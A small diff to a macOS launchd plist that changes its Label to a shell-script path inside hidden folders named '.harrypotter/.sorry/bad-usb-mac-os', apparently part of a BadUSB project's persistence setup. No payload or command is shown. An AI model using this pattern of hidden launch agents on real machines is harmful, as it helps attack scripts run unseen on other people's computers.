@@ -3,7 +3,7 @@
 <plist version="1.0">
 <dict>
     <key>Label</key>
-    <string>/Users/Shared/.harrypotter/.sorry/bad-usb-mac-os/ii.plist</string>
+    <string>/Users/Shared/.harrypotter/.sorry/bad-usb-mac-os/i.sh</string>
     <key>ProgramArguments</key>
     <array>
         <string></string>
